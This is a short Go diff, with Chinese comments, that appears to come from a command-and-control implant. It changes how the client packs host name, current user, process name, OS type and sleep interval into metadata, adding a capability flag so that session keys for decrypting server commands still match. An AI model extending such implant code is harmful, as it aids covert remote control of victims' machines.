@@ -74,11 +74,11 @@ func GetMetaInfoClientID() (string, error) {
 	flagBytes[0] = byte(metadataFlag)
 	binary.BigEndian.PutUint32(localIPBytes, uint32(localIP))
 
-	// 必须与 MakeMetaInfo() 完全一致(含 SleepSeconds 第 5 段):
+	// 必须与 MakeMetaInfo() 完全一致(含 SleepSeconds 第 5 段与 B5 能力标记第 6 段):
 	// 客户端本地 cid 与服务端 MD5(收到的 metainfo) 不同会导致会话密钥派生 uid 不一致 → 命令解密全挂
-	osInfo := fmt.Sprintf("%s\t%s\t%s\t%s\t%d", hostName, currentUser, processName, osTypeName(), config.SleepSeconds())
-	if len(osInfo) > 80 {
-		osInfo = osInfo[:80]
+	osInfo := fmt.Sprintf("%s\t%s\t%s\t%s\t%d\tb1", hostName, currentUser, processName, osTypeName(), config.SleepSeconds())
+	if len(osInfo) > 84 {
+		osInfo = osInfo[:84]
 	}
 	osInfoBytes := []byte(osInfo)
 
